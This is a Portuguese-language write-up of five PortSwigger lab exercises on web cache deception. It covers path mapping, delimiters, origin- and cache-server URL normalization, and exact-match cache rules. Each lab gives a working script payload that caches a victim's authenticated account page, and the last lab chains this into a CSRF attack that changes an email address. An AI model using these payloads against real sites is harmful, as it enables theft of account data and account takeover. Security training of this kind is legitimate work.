---
title: "PortSwigger - Web Cache Deception"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de Web Cache Deception da PortSwigger"
keywords: ["PortSwigger", "Web Cache Deception", "Cache", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Exploiting path mapping for web cache deception

**Objetivo:** Encontrar a chave API do usuário carlos. Login disponível: `wiener:peter`

#### Descoberta da vulnerabilidade

Testamos os endpoints e descobrimos que:
- `GET /my-account` e `GET /my-account/abc` geram a mesma resposta
- `GET /my-account/abc.js` retorna `X-Cache: miss` e `Cache-Control: max-age=30`

Isso indica que recursos com extensão `.js` são armazenados em cache por 30 segundos.

#### Exploração

Confirmamos a vulnerabilidade fazendo uma requisição sem cookies para `/my-account/abc.js` e obtendo o conteúdo da página.

**Payload do exploit:**
```html
<script>
fetch('https://0a180019039de9d580040305000a0065.web-security-academy.net/my-account/abc.js', {credentials: 'include'});
</script>
```

---

## Lab: Exploiting path delimiters for web cache deception

**Objetivo:** Encontrar a chave API do usuário carlos. Login disponível: `wiener:peter`

#### Descoberta do delimitador

Testamos diferentes delimitadores e identificamos que `;` é utilizado pelo servidor de origem:
- `GET /my-account;abc` = mesma resposta que `GET /my-account`
- `GET /my-accountabc` = resposta diferente

#### Teste de cache

A requisição `GET /my-account;.js` retorna:
```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

Confirmando que recursos com extensão `.js` são armazenados em cache.

**Payload do exploit:**
```html
<script>
fetch('https://0ad500b6032ff3d58027d03c001b006f.web-security-academy.net/my-account;.js',{credentials: 'include'})
</script>
```

---

## Lab: Exploiting origin server normalization for web cache deception

**Objetivo:** Encontrar a chave API do usuário carlos. Login disponível: `wiener:peter`

#### Descoberta da normalização

O servidor de origem normaliza URLs:
- `GET /abc/..%2fmy-account` retorna a página da conta do usuário

#### Identificação de recurso estático

No código-fonte encontramos: `/resources/images/avatarDefault.svg`
- Este recurso é armazenado em cache
- `GET /abc/..%2fresources/images/avatarDefault.svg` NÃO é armazenado em cache

### Exploração

Aproveitamos a discrepância: o servidor de cache não normaliza URLs, mas o de origem sim.

**Caminho explorado:** `/resources/..%2fmy-account/`

**Payload do exploit:**
```html
<script>
fetch('https://0a0c0028033a76f0803cf84a007500f9.web-security-academy.net/resources/..%2fmy-account/',{credentials: 'include'})
</script>
```

---

## Lab: Exploiting cache server normalization for web cache deception

**Objetivo:** Encontrar a chave API do usuário carlos. Login disponível: `wiener:peter`

#### Descoberta das diferenças

- Servidor de origem: NÃO normaliza URLs (`GET /abc/..%2fmy-account` falha)
- Servidor de cache: normaliza URLs

#### Identificação do delimitador

Usando fuzzing com ffuf, identificamos que `%23` é o delimitador usado pelo servidor de origem:
- `GET /my-account%23abc` = mesma resposta que `GET /my-account`

#### Exploração

Aproveitamos a discrepância entre os servidores usando:
`/my-account%23%2f%2e%2e%2fresources`

- Servidor de origem resolve para: `/my-account`
- Servidor de cache armazena como: `/resources`

**Payload do exploit:**
```html
<script>
fetch('https://0af7007a03ecf76e82eec90e003900cd.web-security-academy.net/my-account%23%2f%2e%2e%2fresources', { credentials: 'include' })
</script>
```

Depois acessamos `/resources/..%2fmy-account/` para obter a chave do carlos.

---

## Lab: Exploiting exact-match cache rules for web cache deception

#### Descoberta inicial

Usando delimitador `;` e caminho cacheável:
`/my-account;%2f%2e%2e%2frobots.txt`

#### Processo de exploração

1. **Primeira etapa:** Armazenar página do admin em cache
2. **Segunda etapa:** Recuperar token CSRF: `eaY4esxkwHRFOGu8eMdIH4fW41v5UCPl`
3. **Terceira etapa:** Executar ataque CSRF para mudar email

**Payload 2 etapa**:
```html
<script>
fetch("https://0a4e00e304c21fc48013039d007d00af.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt", {
  mode: "no-cors",
  credentials: "include"
});
</script>
```

**Payload final (3 etapa):**
```html
<script>
const body = new URLSearchParams();
body.append("csrf", "eaY4esxkwHRFOGu8eMdIH4fW41v5UCPl");
body.append("email", "newemail@example.com");

// Enviar requisição POST para mudar email
fetch("https://0a4e00e304c21fc48013039d007d00af.web-security-academy.net/my-account/change-email", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: body.toString(),
  credentials: "include",
  mode: "no-cors"
});

// Armazenar página em cache para confirmação
fetch("https://0a4e00e304c21fc48013039d007d00af.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt", {
  mode: "no-cors",
  credentials: "include"
});
</script>
```

**Nota:** Usamos `mode: "no-cors"` para evitar erros CORS durante o teste.
